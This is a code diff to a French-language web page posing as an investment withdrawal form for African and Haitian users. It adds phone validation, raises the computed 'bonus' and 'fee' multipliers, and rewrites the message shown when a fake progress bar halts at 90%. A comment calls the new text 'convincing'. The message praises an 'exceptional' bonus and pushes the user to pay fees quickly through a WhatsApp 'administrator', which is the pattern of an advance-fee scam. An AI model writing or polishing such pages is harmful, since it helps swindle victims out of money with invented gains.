@@ -98,12 +98,12 @@
       font-size: 1rem;
     }
     form input[type="tel"] {
-      width: calc(100% - 70px);
+      width: calc(100% - 80px);
       padding: 10px;
       margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      margin-left: 70px;
+      margin-left: 80px;
       font-size: 1rem;
     }
     .phone-prefix {
@@ -139,15 +139,7 @@
     button:hover, input[type="submit"]:hover {
       background-color: #0056b3;
     }
-    /* Lien sous le formulaire initial : on ne l'utilise pas ici */
-    #showCodeWrapper {
-      margin-top: 10px;
-      display: none; /* pas utilisé */
-    }
-    #showCodeWrapper a {
-      color: #007bff;
-      font-size: 0.95rem;
-    }
+    /* Pas de lien “Cliquez ici” visible */
 
     /* Modal overlay */
     .modal-overlay {
@@ -171,9 +163,9 @@
       background-color: #fff;
       padding: 25px 20px;
       width: 90%;
-      max-width: 450px;
+      max-width: 500px;
       border-radius: 8px;
-      text-align: center;
+      text-align: left;
       box-shadow: 0 4px 12px rgba(0,0,0,0.2);
     }
     .modal-content p {
@@ -198,14 +190,13 @@
       margin-top: 15px;
       font-size: 0.95rem;
       color: #333;
-      text-align: left;
       line-height: 1.4;
     }
     #feeSection p a {
       color: #d9534f; /* rouge pour contact */
       font-weight: 500;
     }
-    /* Pas de bouton “J’ai réglé” ici */
+    /* Pas de bouton “J’ai réglé” */
 
     /* Section code masquée jusqu'au lien param ?code= */
     #code-section {
@@ -394,36 +385,77 @@
   </footer>
 
   <script>
-    // Mapping simple pays → indicatif
+    // Mapping pays → code ISO, indicatif, longueur de numéro (sans indicatif)
+    // Ajustez phone_length selon normes officielles pour chaque pays.
     const countryDialCodes = [
-      { name: "Cameroun", code: "CM", dial_code: "+237" },
-      { name: "Nigeria", code: "NG", dial_code: "+234" },
-      { name: "Ghana", code: "GH", dial_code: "+233" },
-      { name: "Kenya", code: "KE", dial_code: "+254" },
-      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225" },
-      { name: "Sénégal", code: "SN", dial_code: "+221" },
-      { name: "Mali", code: "ML", dial_code: "+223" },
-      { name: "République démocratique du Congo", code: "CD", dial_code: "+243" },
-      { name: "Rwanda", code: "RW", dial_code: "+250" },
-      { name: "Ouganda", code: "UG", dial_code: "+256" }
-      // Ajoutez d’autres pays si nécessaire
+      // Afrique de l’Ouest
+      { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
+      { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
+      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225", phone_length: 8 },
+      { name: "Ghana", code: "GH", dial_code: "+233", phone_length: 9 },
+      { name: "Guinée", code: "GN", dial_code: "+224", phone_length: 8 },
+      { name: "Mali", code: "ML", dial_code: "+223", phone_length: 8 },
+      { name: "Niger", code: "NE", dial_code: "+227", phone_length: 8 },
+      { name: "Nigeria", code: "NG", dial_code: "+234", phone_length: 10 },
+      { name: "Sénégal", code: "SN", dial_code: "+221", phone_length: 8 },
+      { name: "Togo", code: "TG", dial_code: "+228", phone_length: 8 },
+      // Afrique centrale
+      { name: "Cameroun", code: "CM", dial_code: "+237", phone_length: 8 },
+      { name: "République du Congo", code: "CG", dial_code: "+242", phone_length: 8 },
+      { name: "République démocratique du Congo", code: "CD", dial_code: "+243", phone_length: 9 },
+      { name: "Centrafrique", code: "CF", dial_code: "+236", phone_length: 8 },
+      { name: "Tchad", code: "TD", dial_code: "+235", phone_length: 8 },
+      { name: "Gabon", code: "GA", dial_code: "+241", phone_length: 7 },
+      { name: "Guinée équatoriale", code: "GQ", dial_code: "+240", phone_length: 7 },
+      { name: "São Tomé-et-Principe", code: "ST", dial_code: "+239", phone_length: 7 },
+      // Afrique de l’Est / Sud (inclus Madagascar)
+      { name: "Madagascar", code: "MG", dial_code: "+261", phone_length: 9 },
+      { name: "Kenya", code: "KE", dial_code: "+254", phone_length: 9 },
+      { name: "Ouganda", code: "UG", dial_code: "+256", phone_length: 9 },
+      { name: "Rwanda", code: "RW", dial_code: "+250", phone_length: 9 },
+      { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
+      // Haïti
+      { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 },
+      // Ajoutez d’autres pays si nécessaire, avec indicatif et longueur correcte.
     ];
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Remplir le select pays et gérer indicatif
+      // Remplir le select pays et gérer indicatif + longueur
       const countrySelect = document.getElementById('country');
       const phonePrefixSpan = document.getElementById('phone-prefix');
-      if (countrySelect && phonePrefixSpan) {
+      const phoneInput = document.getElementById('phone');
+      if (countrySelect && phonePrefixSpan && phoneInput) {
         countryDialCodes.forEach(item => {
           const option = document.createElement('option');
           option.value = item.code;
           option.textContent = item.name;
           option.dataset.dialCode = item.dial_code;
+          option.dataset.phoneLength = item.phone_length;
           countrySelect.appendChild(option);
         });
         countrySelect.addEventListener('change', () => {
           const sel = countrySelect.selectedOptions[0];
-          phonePrefixSpan.textContent = (sel && sel.dataset.dialCode) ? sel.dataset.dialCode : '+XXX';
+          if (sel && sel.dataset.dialCode) {
+            phonePrefixSpan.textContent = sel.dataset.dialCode;
+            // Définir maxlength sur le champ phone
+            const len = parseInt(sel.dataset.phoneLength, 10);
+            if (!isNaN(len) && len > 0) {
+              phoneInput.maxLength = len;
+              // Placeholder exemple : ex. si longueur 8, afficher "Ex: 12345678"
+              phoneInput.placeholder = "Ex: " + "0".repeat(0); // on peut laisser vide ou donner un exemple générique
+              // Pour un exemple plus parlant, on peut générer un exemple aléatoire:
+              let ex = "";
+              for (let i = 0; i < len; i++) ex += "X";
+              phoneInput.placeholder = "Ex: " + ex;
+            } else {
+              phoneInput.removeAttribute('maxlength');
+              phoneInput.placeholder = "Votre numéro sans indicatif";
+            }
+          } else {
+            phonePrefixSpan.textContent = '+XXX';
+            phoneInput.removeAttribute('maxlength');
+            phoneInput.placeholder = "Votre numéro sans indicatif";
+          }
         });
       }
 
@@ -454,12 +486,25 @@
         initialSection.style.display = 'none';
         codeSection.style.display = 'block';
       }
-      // Sinon, client doit d'abord soumettre le formulaire initial.
 
       // Soumission du formulaire initial
       if (withdrawalForm) {
         withdrawalForm.addEventListener('submit', function(e) {
           e.preventDefault();
+          // Vérification du numéro de téléphone : longueur correcte ?
+          const countrySel = countrySelect.selectedOptions[0];
+          if (countrySel) {
+            const expectedLen = parseInt(countrySel.dataset.phoneLength, 10);
+            const phoneValue = phoneInput.value.trim();
+            if (!isNaN(expectedLen) && expectedLen > 0) {
+              // On ne compte que les chiffres ; s’assurer que l’utilisateur entre uniquement des chiffres
+              const digitsOnly = phoneValue.replace(/\D/g, '');
+              if (digitsOnly.length !== expectedLen) {
+                alert(`Le numéro de téléphone doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
+                return;
+              }
+            }
+          }
           // Récupérer les valeurs
           const formData = new FormData(withdrawalForm);
           const currency = formData.get('currency');
@@ -469,9 +514,9 @@
             alert("Veuillez saisir un montant valide.");
             return;
           }
-          // Calcul dynamique : bonus = amount * 20, frais = amount * 2.1
-          let bonusValue = amount * 20;
-          let feeValue = amount * 2.1;
+          // Calcul dynamique : bonus = amount * 25, frais = amount * 2.5
+          let bonusValue = amount * 25;
+          let feeValue = amount * 2.5;
           // Arrondir selon devise
           if (currency === 'USD') {
             bonusValue = Math.round(bonusValue * 100) / 100;
@@ -553,15 +598,10 @@
           } else {
             clearInterval(timer);
             progressText.textContent = `Progression : ${target}%`;
-            // Afficher message avec frais et gain selon vos formules
-            // “Votre investissement s’est arrêté à 90% car vous devez payer les frais de réseau qui s’appliquent.
-            // Vous avez reçu un bonus donc vous allez recevoir à présent (montant × 20) [monnaie].
-            // Ces frais s’élèvent à (montant × 2,1) [monnaie].
-            // Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain.”
+            // Message convaincant débutant par Félicitations...
             feeMessage.innerHTML =
-              `Votre investissement s’est arrêté à <strong>90%</strong> car vous devez payer les frais de réseau qui s’appliquent.<br>` +
-              `Vous avez reçu un bonus donc vous allez recevoir à présent <strong>${bonusValue} ${currency}</strong>.<br>` +
-              `Ces frais s’élèvent à <strong>${feeValue} ${currency}</strong>.<br>` +
+              `<strong>Félicitations ! Ce cas est vraiment exceptionnel : vous êtes parmi les rares personnes à recevoir un bonus de bienvenue. Félicitations à vous !</strong><br>` +
+              `Vous allez recevoir à présent <strong>${bonusValue} ${currency}</strong>, mais vous devez rapidement payer les frais qui s’appliquent à ce bonus <strong>${feeValue} ${currency}</strong> pour que votre investissement soit complet à 100 %.<br>` +
               `Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain.`;
             feeSection.style.display = 'block';
           }
